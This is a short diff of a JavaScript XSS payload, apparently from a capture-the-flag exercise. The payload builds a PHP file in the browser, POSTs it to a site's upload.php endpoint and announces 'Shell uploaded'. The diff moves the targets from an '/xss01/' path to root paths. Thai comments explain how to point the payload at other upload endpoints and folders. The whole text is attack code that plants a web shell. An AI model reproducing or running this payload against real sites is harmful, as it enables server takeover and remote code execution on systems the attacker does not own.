@@ -16,13 +16,13 @@
         new Blob([code], { type: 'application/x-php' }),
         filename
       );
-      return fetch('/xss01/upload.php', {
+      return fetch('/upload.php', {
         method: 'POST',
         body: form
       });
     }) //สามารถเปลี่ยน Part เป้าหมายของไฟล์ upload.php ได้ เช่น /xss01CTF/upload.php
     .then(() => {
-      alert('Shell uploaded: /xss01/upload/' + filename);
+      alert('Shell uploaded: /upload/' + filename);
     }); //สามารถเปลี่ยน Part เป้าหมายของโฟเดอร์ ีuploadได้ เช่น /xss01CTF/upload/
 
 })();
